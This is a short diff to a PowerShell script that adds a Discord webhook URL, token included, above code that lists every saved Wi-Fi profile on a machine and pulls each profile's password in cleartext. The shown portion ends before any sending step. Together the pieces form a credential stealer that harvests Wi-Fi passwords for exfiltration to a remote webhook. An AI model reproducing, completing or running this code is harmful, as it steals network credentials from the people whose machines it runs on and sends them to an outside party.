@@ -1,3 +1,4 @@
+$discord='https://discord.com/api/webhooks/1324076911655260202/rIdmZGc986E-0lPTVrdHaiSNTiVK9Wzo76T8DtDMbvVkzjqyaZMRwmP6teC9zrXWFJly'
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
